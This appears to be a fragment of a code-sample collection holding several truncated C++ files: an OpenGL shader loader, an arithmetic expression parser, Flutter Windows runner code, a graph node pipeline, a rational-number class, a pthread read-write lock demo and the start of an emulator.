\uc0dd\uc131\ud558\ub294 \ud568\uc218\nGLuint create_shader_from_file(const std::string& filename, GLuint shader_type)\n{\n  GLuint shader = 0;\n\n  shader = glCreateShader(shader_type);\n\n  std::ifstream shader_file(filename.c_str());\n  std::string shader_string;\n\n  shader_string.assign(\n    (std::istreambuf_iterator<char>(shader_file)),\n    std::istreambuf_iterator<char>());\n\n  // Get rid of BOM in the head of shader_string\n  // Because, some GLSL compiler (e.g., Mesa Shader compiler) cannot handle UTF-8 with BOM\n  if (shader_string.compare(0, 3, \"\\xEF\\xBB\\xBF\") == 0)  // Is the file marked as UTF-8?\n  {\n    std::cout << \"Shader code (\" << filename << \") is written in UTF-8 with BOM\" << std::endl;\n    std::cout << \"  When we pass the shader code to GLSL compiler, we temporarily get rid of BOM\" << std::endl;\n    shader_string.erase(0, 3);                  // Now get rid of the BOM.\n  }\n\n  const GLchar* shader_src = shader_string.c_str();\n  glShaderSource(shader, 1, (const GLchar * *)& shader_src, NULL);\n  glCompileShader(shader);\n\n  GLint is_compiled;\n  glGetShaderiv(shader, GL_COMPILE_STATUS, &is_compiled);\n  if (is_compiled != GL_TRUE)\n  {\n    std::cout << \"Shader COMPILE error: \" << std::endl;\n\n    GLint buf_len;\n    glGetShaderiv(shader, GL_INFO_LOG_LENGTH, &buf_len);\n\n    std::string log_string(1 + buf_len, '\\0');\n    glGetShaderInfoLog(shader, buf_len, 0, (GLchar *)log_string.c_str());\n\n    std::cout << \"error_log: \" << log_string << std::endl;\n\n    glDeleteShader(shader);\n    shader = 0;\n  }\n\n  return shader;\n}\n\n// vertex shader\uc640 fragment shader\ub97c \ub9c1\ud06c\uc2dc\ucf1c program\uc744 \uc0dd\uc131\ud558\ub294 \ud568\uc218\nvoid init_shader_program()\n{\n  GLuint vertex_shader\n    = create_shader_from_file(\"./shader/vertex.glsl\", GL_VERTEX_SHADER);\n\n  std::cout << \"vertex_shader id: \" << vertex_shader << std::endl;\n  assert(vertex_shader != 0);\n\n  GLuint fragment_shader\n    = create_shader_from_file(\"./shader/fragment.glsl\", GL_FRAGMENT_SHADER);\n\n  std::cout << \"fragment_shader id: \" << fragment_shader << std::endl;\n  assert(fragment_shader != 0);\n\n  program = glCreateProgram();\n  glAttachShader(program, vertex_shader);\n  glAttachShader(program, fragment_shader);\n  glLinkProgram(program);\n\n  GLint is_linked;\n  glGetProgramiv(program, GL_LINK_STATUS, &is_linked);\n  if (is_linked != GL_TRUE)\n  {\n    std::cout << \"Shader LINK error: \" << std::endl;\n\n    GLint buf_len;\n    glGetProgramiv(program, GL_INFO_LOG_LENGTH, &buf_len);\n\n    std::string log_string(1 + buf_len, '\\0');\n    glGetProgramInfoLog(program, buf_len, 0, (GLchar *)log_string.c_str());\n\n    std::cout << \"error_log: \" << log_string << std::endl;\n\n    glDeleteProgram(program);\n    program = 0;\n  }\n\n  std::cout << \"program id: \" << program << std::endl;\n  assert(program != 0);\n\n  loc_u_PVM = glGetUniformLocation(program, \"u_PVM\");\n\n  loc_a_position = glGetAttribLocation(program, \"a_position\");\n  loc_a_color = glGetAttribLocation(program, \"a_color\");\n}\n\n\n// object rendering\nvoid render_object()\n{\n  // \ud2b9\uc815 \uc250\uc774\ub354 \ud504\ub85c\uadf8\ub7a8 \uc0ac\uc6a9\n  glUseProgram(program);\n\n  /////////////////////////////////////////////////////////////////////\n  /// CPU \uba54\ubaa8\ub9ac\uc5d0\uc11c GPU \uba54\ubaa8\ub9ac\ub85c \ubb3c\uccb4",
    "#include <sstream>\n#include <iostream>\n#include <stdlib.h>\n#include <cstring>\n\nusing namespace std;\n\nclass Token {\npublic:\n  enum Type {PLUS, MINUS, MUL, DIV, LPAREN, RPAREN, NUM, ERR, END};\n  Type type;\n  string text;\n  Token(Type);\n  Token(Type, char c);\n  Token(Type, const string& source, int first, int last);\n};\n\nclass Scanner {\nprivate:\n  string input;\n  int first, current;\npublic:\n  Scanner(const char* in_s);\n  Token* nextToken();\n  ~Scanner();\n\n}; \n\nenum BinaryOp { PLUS, MINUS, MUL, DIV, LPAREN, RPAREN };\n\nclass Exp {\npublic:\n  virtual void print() = 0;\n  virtual int eval() = 0;\n  virtual ~Exp() = 0;\n  static char binopToChar(BinaryOp op);\n};\n\n\nclass BinaryExp : public Exp {\npublic:\n  Exp *left, *right;\n  BinaryOp op;\n  BinaryExp(Exp* l, Exp* r, BinaryOp op);\n  void print();\n  int eval();\n  ~BinaryExp();\n};\n\nclass NumberExp : public Exp {\npublic:\n  int value; // Atributo entero\n\n  NumberExp(int v); // Constructor\n\n  // M\u00e9todos\n  void print();\n  int eval();\n\n  ~NumberExp(); // Destructor\n};\n\n// class ParenthExp : public Exp {\n\n// }\n\nclass Parser {\nprivate:\n  Scanner* scanner;\n  Token *current, *previous;\n  bool match(Token::Type ttype);\n  bool check(Token::Type ttype);\n  bool advance();\n  bool isAtEnd();\n  Exp* parseExpression();\n  Exp* parseTerm();\n  Exp* parseFactor();\n  bool tokenToOp(Token* tk, BinaryOp& op);\npublic:\n  Parser(Scanner* scanner);\n  Exp* parse();\n};\n\n/* ******** Token definition ********* */\n\nToken::Token(Type type):type(type) { text = \"\"; }\n\nToken::Token(Type type, char c):type(type) { text = c; }\n\nToken::Token(Type type, const string& source, int first, int last):type(type) {\n  text = source.substr(first,last);\n}\n\nstd::ostream& operator << ( std::ostream& outs, const Token & tok )\n{\n  if (tok.text.empty())\n    return outs << tok.type;\n  else\n    // return outs << tok.type << \"(\" << tok.text << \")\";\n    return outs << \"TOK\" << \"(\" << tok.text << \")\";\n}\n\nstd::ostream& operator << ( std::ostream& outs, const Token* tok ) {\n  return outs << *tok;\n}\n\n/* ******** Scanner definition ********* */\n\nScanner::Scanner(const char* s):input(s),first(0), current(0) { }\n\nToken* Scanner::nextToken() {\n  Token* token;\n  // consume whitespaces\n  while (input[current]==' ') current++;\n  if (input[current] == '\\0') return new Token(Token::END);\n  char c  = input[current];\n  first = current;\n  if (isdigit(c)) {\n    current++;\n    while (isdigit(input[current]))\n      current++;\n    token = new Token(Token::NUM,input,first,current-first);\n  } else if (strchr(\"+-*/()\", c)) {\n    switch(c) {\n      case '+': token = new Token(Token::PLUS,c); break;\n      case '-': token = new Token(Token::MINUS,c); break;\n      case '*': token = new Token(Token::MUL,c); break;\n      case '/': token = new Token(Token::DIV,c); break;\n      case '(': token = new Token(Token::LPAREN,c); break;\n      case ')': token = new Token(Token::RPAREN,c); break;\n      default: cout << \"No deberia llegar aca\" << endl;\n    }\n    current++;\n  } else {\n    token = new Token(Token::ERR, c);\n    current++;\n  }\n  return token;\n}\n\nScanner::~Scanner() { }\n\n/* ******** Parser definition ********* */\n\n// match and consume next token\nbool Parser::match(Token::Type ttype) {\n  if (check(ttype)) {\n    advance();\n    return true;\n  }\n  return false;\n}\n\nbool Parser::check(Token::Type ttype) {\n  if (isAtEnd()) return false;\n  return current->type == ttype;\n}\n\nbool Parser::advance() {\n  if (!isAtEnd()) {\n    Token* temp =current;\n    if (previous) delete previous;\n    current = scanner->nextToken();\n    previous = temp;\n    if (check(Token::ERR)) {\n      cout << \"Parse error, unrecognised character: \" << current->text << endl;\n      exit(0);\n    }\n    return true;\n  }\n  return false;\n} \n\nbool Parser::isAtEnd() {\n  return (current->type == Token::END);\n} \n\nParser::Parser(Scanner* sc):scanner(sc) {\n  previous = current = NULL;\n  return;\n};\n\nExp* Parser::parse() {\n  // get first token\n  current = scanner->nextToken();\n  if (check(Token::ERR)) {\n      cout << \"Error en scanner - caracter invalido\" << endl;\n      exit(0);\n  }\n  Exp* exp = parseExpression();\n  // cout << \"last token: \" << current << endl;\n  if (current) delete current;\n  return exp;\n}\n\nExp* Parser::parseExpression() {\n\n  Exp* left = parseTerm();\n\n  while (match(Token::PLUS) || match(Token::MINUS)) {\n    BinaryOp op = (previous->type == Token::PLUS) ? PLUS : MINUS;    \n    Exp* right = parseTerm();\n    left = new BinaryExp(left, right, op); \n  }\n  \n  return left;\n}\n\nExp* Parser::parseTerm() {\n  Exp* left = parseFactor();\n\n  while (match(Token::MUL) || match(Token::DIV)) {\n    BinaryOp op = (previous->type == Token::MUL) ? MUL : DIV;    \n    Exp* right = parseFactor();\n    left = new BinaryExp(left, right, op); \n  }\n  \n  return left;\n\n\n  Exp* e = parseFactor();\n  return e;\n}\n\nExp* Parser::parseFactor() {\n  Exp* e;\n\n  if (match(Token::NUM)) {\n    return new NumberExp(stoi(previous->text));\n  }\n\n  if (match(Token::LPAREN)) {\n    e = parseExpression();\n\n    if (match(Token::RPAREN))\n      return e;\n  ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter15_draggable_dragtarget_sizedbox_material\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"graph.h\"\n\n#include <iostream>\n\n#include \"node_1.h\"\n#include \"node_2.h\"\n#include \"node_3.h\"\n#include \"node_4.h\"\n\nnamespace tng_v1 {\n\nGraph::Graph() {\n    std::cout << \"Graph::Graph ...\" << std::endl;\n    m_dataCenter = std::shared_ptr<DataCenter>(new DataCenter);\n\n    std::vector<std::string> config = {\n        \"Node1\",\n        \"Node2:Node1\",\n        \"Node3:Node1\",\n        \"Node4:Node2:Node3\"\n    };\n\n    setConfig(config);\n}\n\nbool Graph::setConfig(const std::vector<std::string>& config) {\n    std::cout << \"Graph::setConfig ... \" << std::endl;\n\n    m_config.clear();\n    for (size_t i = 0; i < config.size(); ++i) {\n        std::vector<std::string> stringList;\n        if (!splitString(config[i], \":\", stringList)) {\n            std::cerr << \"parse config err: \" << config[i] << std::endl;\n            return false;\n        }\n        m_config.emplace_back(std::move(stringList));\n    }\n\n    return true;\n}\n\nbool Graph::buildGraph() {\n    std::cout << \"Graph::buildGraph ...\" << std::endl;\n\n    // 1. \u5148\u6784\u9020\u8f93\u5165\u8282\u70b9\n    for (const std::vector<std::string>& c : m_config) {\n        if (c.size() == 1) {\n            std::unique_ptr<Node> node = createNode(c[0]);\n            std::promise<std::shared_ptr<DataCenter>> ipr;\n            ipr.set_value(m_dataCenter);\n            node->setInputData(ipr.get_future().share());\n            m_nodes[c[0]] = std::move(node);\n        }\n    }\n\n    // 2. \u6784\u9020\u666e\u901a\u8282\u70b9\n    std::vector<std::string> c;\n    while (findNotCreatedNodes(c)) {\n        if (c.size() > 1) {\n            auto it = m_nodes.find(c[0]);\n            if (it == m_nodes.end()) {\n                size_t i = 1;\n                for (; i < c.size(); ++i) {\n                    if (m_nodes.find(c[i]) == m_nodes.end()) {\n                        break;\n                    }\n                }\n                \n                // \u6ca1\u6709\u627e\u5230\u5168\u90e8\u4f9d\u8d56\u7684\u8282\u70b9\uff0c\u5219\u4e0d\u521b\u5efa\u8fd9\u4e2a\u8282\u70b9\uff0c\u76f4\u5230\u627e\u5230\u6240\u6709\u7684\u4f9d\u8d56\u8282\u70b9\n                if (i != c.size()) {\n                    continue;\n                }\n\n                std::unique_ptr<Node> node = createNode(c[0]);\n                i = 1;\n                for (; i < c.size(); ++i) {\n                    auto depNode = m_nodes.find(c[i]);\n                    node->setInputData(depNode->second->getOutputData());\n                }\n                m_nodes[c[0]] = std::move(node);\n            }\n        } else {\n            break;\n        }\n    }\n    return true;\n}\n\nstd::shared_future<std::shared_ptr<DataCenter>> Graph::getEndNodeData() {\n    // 1. \u627e\u5230\u6700\u540e\u4e00\u4e2a\u8282\u70b9\n    for (const std::vector<std::string>& c : m_config) {\n        if (c.size() > 1) {\n            const std::string& endNodeName = c[0];\n            bool isEndNode = true;\n            for (const std::vector<std::string>& ec : m_config) {\n                if (!isEndNode) {\n                    break;\n                }\n\n                if (ec.size() > 1 && endNodeName != ec[0]) {\n                    for (size_t i = 1; i < ec.size(); ++i) {\n                        if (ec[i] == endNodeName) {\n                            isEndNode = false;\n                            break;\n                        }\n                    }\n                }\n            }\n\n            if (isEndNode) {\n                // 2. \u83b7\u53d6DataCenter\n                return m_nodes[endNodeName]->getOutputData();\n            }\n        }\n    }\n\n    std::promise<std::shared_ptr<DataCenter>> dc;\n    dc.set_value(std::shared_ptr<DataCenter>(new DataCenter));\n    return dc.get_future().share();\n}\n\nvoid Graph::run() {\n    for (auto& node : m_nodes) {\n        m_thread.emplace_back(&Node::run, node.second.get());\n    }\n\n    for (auto& t : m_thread) {\n        t.join();\n    }\n}\n\nbool Graph::findNotCreatedNodes(std::vector<std::string>& c) {\n    for (const std::vector<std::string>& con : m_config) {\n        if (con.size() > 0) {\n            if (m_nodes.find(con[0]) == m_nodes.end()) {\n                c.assign(con.begin(), con.end());\n                return true;\n            }\n        }\n    }\n    return false;\n}\n\nstd::unique_ptr<Node> Graph::createNode(const std::string& depString) {\n    std::unique_ptr<Node> node;\n    if (depString == \"Node1\") {\n        m_dataCenter->node1InputData = std::shared_ptr<Node1InputData>(new Node1InputData);\n        m_dataCenter->node1InputData->a = m_graphInputData.gda;\n        m_dataCenter->node1InputData->b = m_graphInputData.gdb;\n        node = std::make_unique<Node1>();\n    } else if (depString == \"Node2\") {\n        node = std::make_unique<Node2>();\n    } else if (depString == \"Node3\") {\n        node = std::make_unique<Node3>();\n    } else if (depString == \"Node4\") {\n        node = std::make_unique<Node4>();\n    }\n    return node;\n}\n\nbool Graph::splitString(std::string depString, const std::string& token,\n                  std::vector<std::string>& stringList) {\n    for (std::string::size_type pos = depString.find(token);\n            pos != std::string::npos;\n            pos = depString.find(token)) {\n        stringList.emplace_back(depString.substr(0, pos));\n        depString = depString.substr(pos + 1);\n    }\n\n    if (!depStr",
    "//\r\n// Rational Number.cpp : This file contains the 'main' function. Program execution begins and ends there.\r\n//\r\n\r\n#include <iostream>\r\n#include <fstream>\r\nusing namespace std;\r\n\r\n\r\nclass rational {\r\n\r\npublic:\r\n    int n;\r\n    int d;\r\n    rational()\r\n    {\r\n        n =0;\r\n        d = 1;\r\n    }\r\n    void  setter()\r\n    {\r\n        cout << \"enter n:\";\r\n        cin >> n;\r\n        bool t;\r\n        do {\r\n          //  t = false;\r\n            cout << \"Enter d: \";\r\n            cin >> d;\r\n\r\n            if (d == 0)\r\n            {\r\n                t = true;\r\n                cout << \"invalid\" << endl;\r\n            }\r\n            else\r\n            {\r\n                t = false;\r\n            }\r\n        } while (t);\r\n\r\n        cout << \"enter d:\";\r\n        cin >> d;\r\n    }\r\n\r\n    friend istream& operator>>(istream& cinn, rational& num) {\r\n\r\n        cout << \"Enter Rational number numerator: \";\r\n        cinn >> num.n;\r\n\r\n        \r\n            cout << \"Enter Rational number denominator: \";\r\n            cinn >> num.d;\r\n\r\n           \r\n\r\n        return cinn;\r\n    }\r\n\r\n    friend ostream& operator<<(ostream& coutt, const rational& num) {\r\n        coutt << \"numerator:\" << num.n << endl;\r\n        coutt<<\" denominator:\" << num.d;\r\n        return coutt;\r\n    }\r\n   \r\n    rational operator+(rational &bb)\r\n    {\r\n        rational add;\r\n        add.n = (n * bb.d) + (d * bb.n);\r\n        add.d = d * bb.d;\r\n        return add;\r\n    }\r\n\r\n     void operator+=(rational& bb)\r\n    {\r\n       \r\n        n = (n * bb.d) + (d * bb.n);\r\n        d = d * bb.d;\r\n        return;\r\n    }\r\n\r\n     /*void operator++()\r\n     {\r\n\r\n         n = (n * d) + (d * bb.n);\r\n         d = d;\r\n         return;\r\n     }*/\r\n\r\n    rational operator-(rational& bb)\r\n    {\r\n        rational s;\r\n        s.n = (n * bb.d) - (d * bb.n);\r\n        s.d = d * bb.d;\r\n        return s;\r\n    }\r\n\r\n    rational operator*(rational& bb)\r\n    {\r\n        rational s;\r\n        s.n = (n *bb.n);\r\n        s.d = d * bb.d;\r\n        return s;\r\n    }\r\n\r\n    rational operator/(rational& bb)\r\n    {\r\n        rational s;\r\n        s.n = n *bb.d;\r\n        s.d = d * bb.n;\r\n        return s;\r\n    }\r\n\r\n    bool operator>(rational& bb)\r\n    {        \r\n        if ((n / d) > (bb.n / bb.d))\r\n            return true;\r\n\r\n        else\r\n            return false;\r\n    }\r\n\r\n    bool operator<(rational& bb)\r\n    {\r\n        if ((n / d) < (bb.n / bb.d))\r\n            return true;\r\n\r\n        else\r\n            return false;\r\n    }\r\n\r\n    bool operator==(rational& bb)\r\n    {\r\n        if ((n / d) == (bb.n / bb.d))\r\n            return true;\r\n\r\n        else\r\n            return false;\r\n    }\r\n\r\n  \r\n   \r\n\r\n    \r\n     \r\n\r\n    \r\n   \r\n\r\n    ~rational()\r\n    {\r\n       \r\n    }\r\n};\r\n\r\n\r\n\r\nint main()\r\n{\r\n    \r\n   \r\n            bool cc;\r\n    rational a1, a2,a;\r\n    int choice;\r\n\r\n    \r\n\r\n            bool ff;\r\n            rational num;\r\n    do\r\n    {\r\n        cout << \"============================================\" << endl;\r\n       \r\n        cout << \"1. Rational Number Setter\" << endl;\r\n        cout << \"2. Addition\" << endl;\r\n        cout << \"3. Subtraction\" << endl;\r\n        cout << \"4. Multiply\" << endl;\r\n        cout << \"5. Division\" << endl;\r\n        cout << \"6. > operator\" << endl;\r\n        cout << \"7. < operator\" << endl;\r\n        cout << \"8. check == \" << endl;\r\n        cout << \"9. stream operator\" << endl;\r\n        cout << \"0. Exit\" << endl;\r\n        cout << \"Enter Choice:\";\r\n        cin >> choice;\r\n      switch (choice)\r\n        {\r\n        case 1:\r\n            cout << \"Enter 1st Rational Num:\" << endl;\r\n            a1.setter();\r\n            cout << \"Enter 2nd Rational Num:\" << endl;\r\n            a2.setter();\r\n            a1 += a2;\r\n            cout << a1 << endl;\r\n            break;\r\n        case 2:\r\n             a = a1 + a2;\r\n             cout << a << endl;\r\n            break;\r\n\r\n        case 3:\r\n            a = a1 - a2;\r\n            cout << a << endl;\r\n            break;\r\n\r\n        case 4:\r\n            a = a1 * a2;\r\n            cout << a << endl;\r\n            break;\r\n        case 5:\r\n            a = a1 / a2;\r\n            cout << a << endl;\r\n            break;\r\n        case 6:\r\n            cc = a1 > a2;\r\n\r\n            if (cc)\r\n                cout << \"a1 is greater\" << endl;\r\n            else\r\n                cout << \"a1 is not greater\" << endl;\r\n            \r\n            break;\r\n        case 7:\r\n            ff = a1 < a2;\r\n\r\n            if (ff)\r\n                cout << \"a1 is smaller\" << endl;\r\n            else\r\n                cout << \"a1 is not smaller\" << endl;\r\n            break;\r\n        case 8:\r\n\r\n            if (a1 == a2)\r\n                cout << \"a1==a2\" << endl;\r\n            else\r\n                cout << \"a1!=a2\" << endl;\r\n            \r\n            break;\r\n        case 9:\r\n            cin >> num;\r\n            cout << num << endl;\r\n\r\n            break;\r\n     \r\n        case 0:\r\n\r\n            break;\r\n        default:\n            cout << \"invalid num.\" << endl;\n            break;\r\n        }\r\n    } while (choice != 0);\r\n  \r\n    retu",
    "#include <iostream>\n#include <pthread.h>\n\n// \u5b9a\u4e49\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u7528\u4e8e\u5b58\u50a8\u5171\u4eab\u6570\u636e\nstruct Data {\n    int value;\n    pthread_rwlock_t lock; // \u8bfb\u5199\u9501\n};\n\n// \u8bfb\u53d6\u6570\u636e\u7684\u7ebf\u7a0b\u51fd\u6570\nvoid* reader_thread(void* arg) {\n    Data* data = static_cast<Data*>(arg);\n\n    pthread_rwlock_rdlock(&data->lock); // \u83b7\u53d6\u8bfb\u9501\n\n    std::cout << \"Reader thread: Reading value = \" << data->value << std::endl;\n\n    pthread_rwlock_unlock(&data->lock); // \u89e3\u9501\n\n    return nullptr;\n}\n\n// \u5199\u5165\u6570\u636e\u7684\u7ebf\u7a0b\u51fd\u6570\nvoid* writer_thread(void* arg) {\n    Data* data = static_cast<Data*>(arg);\n\n    pthread_rwlock_wrlock(&data->lock); // \u83b7\u53d6\u5199\u9501\n\n    data->value++; // \u4fee\u6539\u6570\u636e\n\n    std::cout << \"Writer thread: Writing value = \" << data->value << std::endl;\n\n    pthread_rwlock_unlock(&data->lock); // \u89e3\u9501\n\n    return nullptr;\n}\n\nint main() {\n    // \u521d\u59cb\u5316\u6570\u636e\u7ed3\u6784\u548c\u8bfb\u5199\u9501\n    Data data;\n    data.value = 0;\n    pthread_rwlock_init(&data.lock, nullptr);\n\n    // \u521b\u5efa\u8bfb\u53d6\u6570\u636e\u7684\u7ebf\u7a0b\n    pthread_t reader;\n    pthread_create(&reader, nullptr, reader_thread, &data);\n\n    // \u521b\u5efa\u5199\u5165\u6570\u636e\u7684\u7ebf\u7a0b\n    pthread_t writer;\n    pthread_create(&writer, nullptr, writer_thread, &data);\n\n    // \u7b49\u5f85\u7ebf\u7a0b\u7ed3\u675f\n    pthread_join(reader, nullptr);\n    pthread_join(writer, nullptr);\n\n    // \u9500\u6bc1\u8bfb\u5199\u9501\n    pthread_rwlock_destroy(&data.lock);\n\n    return 0;\n}\n\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "//--------------------------------------------------//\n// Headers\n//--------------------------------------------------//\n#include <cmath>\n#include <cstdint>\n#include <cstdlib>\n#include <fstream>\n#include <iomanip>\n#include <iostream>\n#include <string>\n#include <vector>\n\n//--------------------------------------------------//\n// Definitions\n//--------------------------------------------------//\n#define __RHEA_VERSION__ \"0.1.0-alpha.9\"\n#define __RHEA_DEBUG__ 0\n\n//--------------------------------------------------//\n// Code\n//--------------------------------------------------//\nnamespace Rhea {\n    /**\n     * @brief Converts a value into its hexadecimal representation.\n     * @param value The value.\n     * @param digits The digits.\n     * @return The hexadecimal representation.\n     */\n    static std::string format_hex(const std::uint16_t value, const std::uint8_t digits = 4) {\n        std::stringstream converter;\n\n        converter << std::setfill('0') << std::setw(digits) << std::uppercase << std::hex << value;\n\n        return converter.str();\n    }\n\n    /**\n     * @brief Checks if a string is prefixed.\n     * @param string The string.\n     * @param prefix The prefix.\n     * @return Whether or not is the string prefixed.\n     */\n    static bool is_prefixed(const std::string string, const std::string prefix) {\n        return string.size() >= prefix.size() && 0 == string.compare(0, prefix.size(), prefix);\n    }\n\n    /**\n     * @brief Checks if a string is suffixed.\n     * @param string The string.\n     * @param suffix The suffix.\n     * @return Whether or not is the string suffixed.\n     */\n    static bool is_suffixed(const std::string string, const std::string suffix) {\n        return string.size() >= suffix.size() && 0 == string.compare(string.size() - suffix.size(), suffix.size(), suffix);\n    }\n\n    /**\n     * @brief Splits a string into tokens.\n     * @param string The string.\n     * @param delimiter The delimiter\n     * @return The tokens.\n     * @note Solution from https://stackoverflow.com/questions/14265581.\n     */\n    static std::vector<std::string> split(const std::string string, const std::string delimiter) {\n        std::size_t start = 0, end = 0, size = delimiter.size();\n        std::string token;\n        std::vector<std::string> tokens;\n\n        while((end = string.find(delimiter, start)) != std::string::npos) {\n            token = string.substr(start, end - start);\n            start = end + size;\n            tokens.push_back(token);\n        }\n\n        tokens.push_back(string.substr(start));\n\n        return tokens;\n    }\n\n    class Memory {\n        public:\n            /**\n             * @brief Constructor.\n             */\n            Memory() {\n                this->data = new std::uint8_t[0x10000]();\n            }\n\n            /**\n             * @brief Get a byte from a specific address.\n             * @param address The address of the byte.\n             * @return The byte\n             */\n            std::uint8_t get(const std::uint16_t address) const noexcept {\n                return this->data[address];\n            }\n\n            /**\n             * @brief Set a byte from a specific address to a specific value.\n             * @param address The address\n             * @param value The value.\n             * @return Self-reference.\n             */\n            Memory & set(const std::uint16_t address, const std::uint8_t value) noexcept {\n                this->data[address] = value;\n                return *this;\n            }\n\n            /**\n             * @brief Loads the contents of a binary file into the ROM.\n             * @param path The path to the file.\n             * @return If the operation was successful.\n             */\n            bool load(const std::string path) {\n                std::ifstream file = std::ifstream(path, std::ios::binary);\n\n                if(!file.is_open()) {\n                    std::cerr << \"\\tFile at \\\"\" << path << \"\\\" not found.\" << std::endl;\n                    return false;\n                }\n\n                if(!file.read(reinterpret_cast<char *> (&this->data[0x8000]), 0x8000)) {\n                    std::cerr << \"\\tFile at \\\"\" << path << \"\\\" can't be loaded.\" << 